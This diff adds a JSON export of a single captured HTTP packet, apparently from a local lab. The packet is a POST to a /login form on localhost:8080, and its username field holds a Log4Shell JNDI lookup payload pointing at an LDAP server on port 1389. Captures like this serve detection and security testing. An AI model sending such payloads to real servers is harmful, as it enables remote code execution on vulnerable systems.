@@ -1,0 +1,198 @@
+{
+    
+    "_index": "packets-2025-03-30",
+    "_type": "doc",
+    "_score": null,
+    "_source": {
+      "layers": {
+        "frame": {
+          "frame.section_number": "1",
+          "frame.interface_id": "0",
+          "frame.interface_id_tree": {
+            "frame.interface_name": "any"
+          },
+          "frame.encap_type": "25",
+          "frame.time": "Mar 30, 2025 13:58:26.410279940 Est (heure d’été)",
+          "frame.time_utc": "Mar 30, 2025 17:58:26.410279940 UTC",
+          "frame.time_epoch": "1743357506.410279940",
+          "frame.offset_shift": "0.000000000",
+          "frame.time_delta": "0.000828710",
+          "frame.time_delta_displayed": "0.000828710",
+          "frame.time_relative": "13.906022517",
+          "frame.number": "266",
+          "frame.len": "789",
+          "frame.cap_len": "789",
+          "frame.marked": "1",
+          "frame.ignored": "0",
+          "frame.protocols": "sll:ethertype:ip:tcp:http:urlencoded-form",
+          "frame.coloring_rule.name": "HTTP",
+          "frame.coloring_rule.string": "http || tcp.port == 80 || http2"
+        },
+        "sll": {
+          "sll.pkttype": "0",
+          "sll.hatype": "772",
+          "sll.halen": "6",
+          "sll.src.eth": "00:00:00:00:00:00",
+          "sll.unused": "00:01",
+          "sll.etype": "0x0800"
+        },
+        "ip": {
+          "ip.version": "4",
+          "ip.hdr_len": "20",
+          "ip.dsfield": "0x00",
+          "ip.dsfield_tree": {
+            "ip.dsfield.dscp": "0",
+            "ip.dsfield.ecn": "0"
+          },
+          "ip.len": "773",
+          "ip.id": "0x3554",
+          "ip.flags": "0x02",
+          "ip.flags_tree": {
+            "ip.flags.rb": "0",
+            "ip.flags.df": "1",
+            "ip.flags.mf": "0"
+          },
+          "ip.frag_offset": "0",
+          "ip.ttl": "64",
+          "ip.proto": "6",
+          "ip.checksum": "0x049d",
+          "ip.checksum.status": "2",
+          "ip.src": "127.0.0.1",
+          "ip.addr": "127.0.0.1",
+          "ip.src_host": "127.0.0.1",
+          "ip.host": "127.0.0.1",
+          "ip.dst": "127.0.0.1",
+          "ip.addr": "127.0.0.1",
+          "ip.dst_host": "127.0.0.1",
+          "ip.host": "127.0.0.1",
+          "ip.stream": "9"
+        },
+        "tcp": {
+          "tcp.srcport": "48874",
+          "tcp.dstport": "8080",
+          "tcp.port": "48874",
+          "tcp.port": "8080",
+          "tcp.stream": "11",
+          "tcp.stream.pnum": "4",
+          "tcp.completeness": "15",
+          "tcp.completeness_tree": {
+            "tcp.completeness.rst": "0",
+            "tcp.completeness.fin": "0",
+            "tcp.completeness.data": "1",
+            "tcp.completeness.ack": "1",
+            "tcp.completeness.syn-ack": "1",
+            "tcp.completeness.syn": "1",
+            "tcp.completeness.str": "··DASS"
+          },
+          "tcp.len": "721",
+          "tcp.seq": "1",
+          "tcp.seq_raw": "1630393029",
+          "tcp.nxtseq": "722",
+          "tcp.ack": "1",
+          "tcp.ack_raw": "697231944",
+          "tcp.hdr_len": "32",
+          "tcp.flags": "0x0018",
+          "tcp.flags_tree": {
+            "tcp.flags.res": "0",
+            "tcp.flags.ae": "0",
+            "tcp.flags.cwr": "0",
+            "tcp.flags.ece": "0",
+            "tcp.flags.urg": "0",
+            "tcp.flags.ack": "1",
+            "tcp.flags.push": "1",
+            "tcp.flags.reset": "0",
+            "tcp.flags.syn": "0",
+            "tcp.flags.fin": "0",
+            "tcp.flags.str": "·······AP···"
+          },
+          "tcp.window_size_value": "512",
+          "tcp.window_size": "65536",
+          "tcp.window_size_scalefactor": "128",
+          "tcp.checksum": "0x00fa",
+          "tcp.checksum.status": "2",
+          "tcp.urgent_pointer": "0",
+          "tcp.options": "01:01:08:0a:be:48:51:22:be:48:51:21",
+          "tcp.options_tree": {
+            "tcp.options.nop": "01",
+            "tcp.options.nop_tree": {
+              "tcp.option_kind": "1"
+            },
+            "tcp.options.nop": "01",
+            "tcp.options.nop_tree": {
+              "tcp.option_kind": "1"
+            },
+            "tcp.options.timestamp": "08:0a:be:48:51:22:be:48:51:21",
+            "tcp.options.timestamp_tree": {
+              "tcp.option_kind": "8",
+              "tcp.option_len": "10",
+              "tcp.options.timestamp.tsval": "3192410402",
+              "tcp.options.timestamp.tsecr": "3192410401"
+            }
+          },
+          "Timestamps": {
+            "tcp.time_relative": "0.000850722",
+            "tcp.time_delta": "0.000828710"
+          },
+          "tcp.analysis": {
+            "tcp.analysis.initial_rtt": "0.000022012",
+            "tcp.analysis.bytes_in_flight": "721",
+            "tcp.analysis.push_bytes_sent": "721"
+          },
+          "tcp.payload": "50:4f:53:54:20:2f:6c:6f:67:69:6e:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:6c:6f:63:61:6c:68:6f:73:74:3a:38:30:38:30:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:4d:6f:7a:69:6c:6c:61:2f:35:2e:30:20:28:58:31:31:3b:20:4c:69:6e:75:78:20:78:38:36:5f:36:34:3b:20:72:76:3a:31:30:39:2e:30:29:20:47:65:63:6b:6f:2f:32:30:31:30:30:31:30:31:20:46:69:72:65:66:6f:78:2f:31:31:35:2e:30:0d:0a:41:63:63:65:70:74:3a:20:74:65:78:74:2f:68:74:6d:6c:2c:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:68:74:6d:6c:2b:78:6d:6c:2c:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:6d:6c:3b:71:3d:30:2e:39:2c:69:6d:61:67:65:2f:61:76:69:66:2c:69:6d:61:67:65:2f:77:65:62:70:2c:2a:2f:2a:3b:71:3d:30:2e:38:0d:0a:41:63:63:65:70:74:2d:4c:61:6e:67:75:61:67:65:3a:20:66:72:2c:66:72:2d:46:52:3b:71:3d:30:2e:38:2c:65:6e:2d:55:53:3b:71:3d:30:2e:35:2c:65:6e:3b:71:3d:30:2e:33:0d:0a:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:2c:20:64:65:66:6c:61:74:65:2c:20:62:72:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:77:77:77:2d:66:6f:72:6d:2d:75:72:6c:65:6e:63:6f:64:65:64:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:36:35:0d:0a:4f:72:69:67:69:6e:3a:20:68:74:74:70:3a:2f:2f:6c:6f:63:61:6c:68:6f:73:74:3a:38:30:38:30:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:52:65:66:65:72:65:72:3a:20:68:74:74:70:3a:2f:2f:6c:6f:63:61:6c:68:6f:73:74:3a:38:30:38:30:2f:0d:0a:43:6f:6f:6b:69:65:3a:20:4a:53:45:53:53:49:4f:4e:49:44:3d:34:42:44:35:30:41:46:33:33:39:37:36:41:36:45:30:36:38:30:33:38:46:45:34:33:34:32:42:42:32:36:36:0d:0a:55:70:67:72:61:64:65:2d:49:6e:73:65:63:75:72:65:2d:52:65:71:75:65:73:74:73:3a:20:31:0d:0a:53:65:63:2d:46:65:74:63:68:2d:44:65:73:74:3a:20:64:6f:63:75:6d:65:6e:74:0d:0a:53:65:63:2d:46:65:74:63:68:2d:4d:6f:64:65:3a:20:6e:61:76:69:67:61:74:65:0d:0a:53:65:63:2d:46:65:74:63:68:2d:53:69:74:65:3a:20:73:61:6d:65:2d:6f:72:69:67:69:6e:0d:0a:53:65:63:2d:46:65:74:63:68:2d:55:73:65:72:3a:20:3f:31:0d:0a:0d:0a:75:6e:61:6d:65:3d:25:32:34:25:37:42:6a:6e:64:69:25:33:41:6c:64:61:70:25:33:41:25:32:46:25:32:46:6c:6f:63:61:6c:68:6f:73:74:25:33:41:31:33:38:39:25:32:46:61:25:37:44:26:70:61:73:73:77:6f:72:64:3d"
+        },
+        "http": {
+          "POST /login HTTP/1.1\\r\\n": {
+            "http.request.method": "POST",
+            "http.request.uri": "/login",
+            "http.request.version": "HTTP/1.1"
+          },
+          "http.host": "localhost:8080",
+          "http.request.line": "Host: localhost:8080\r\n",
+          "http.user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+          "http.request.line": "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n",
+          "http.accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+          "http.request.line": "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n",
+          "http.accept_language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
+          "http.request.line": "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3\r\n",
+          "http.accept_encoding": "gzip, deflate, br",
+          "http.request.line": "Accept-Encoding: gzip, deflate, br\r\n",
+          "http.content_type": "application/x-www-form-urlencoded",
+          "http.request.line": "Content-Type: application/x-www-form-urlencoded\r\n",
+          "http.content_length_header": "65",
+          "http.content_length_header_tree": {
+            "http.content_length": "65"
+          },
+          "http.request.line": "Content-Length: 65\r\n",
+          "http.request.line": "Origin: http://localhost:8080\r\n",
+          "http.connection": "keep-alive",
+          "http.request.line": "Connection: keep-alive\r\n",
+          "http.referer": "http://localhost:8080/",
+          "http.request.line": "Referer: http://localhost:8080/\r\n",
+          "http.cookie": "JSESSIONID=4BD50AF33976A6E068038FE4342BB266",
+          "http.cookie_tree": {
+            "http.cookie_pair": "JSESSIONID=4BD50AF33976A6E068038FE4342BB266"
+          },
+          "http.request.line": "Cookie: JSESSIONID=4BD50AF33976A6E068038FE4342BB266\r\n",
+          "http.request.line": "Upgrade-Insecure-Requests: 1\r\n",
+          "http.request.line": "Sec-Fetch-Dest: document\r\n",
+          "http.request.line": "Sec-Fetch-Mode: navigate\r\n",
+          "http.request.line": "Sec-Fetch-Site: same-origin\r\n",
+          "http.request.line": "Sec-Fetch-User: ?1\r\n",
+          "\\r\\n": "",
+          "http.request": "1",
+          "http.request.full_uri": "http://localhost:8080/login",
+          "http.file_data": "75:6e:61:6d:65:3d:25:32:34:25:37:42:6a:6e:64:69:25:33:41:6c:64:61:70:25:33:41:25:32:46:25:32:46:6c:6f:63:61:6c:68:6f:73:74:25:33:41:31:33:38:39:25:32:46:61:25:37:44:26:70:61:73:73:77:6f:72:64:3d"
+        },
+        "urlencoded-form": {
+          "Form item: \"uname\" = \"${jndi:ldap://localhost:1389/a}\"": {
+            "urlencoded-form.key": "uname",
+            "urlencoded-form.value": "${jndi:ldap://localhost:1389/a}"
+          },
+          "Form item: \"password\" = \"\"": {
+            "urlencoded-form.key": "password",
+            "urlencoded-form.value": ""
+          }
+        }
+      }
+    }
+  }
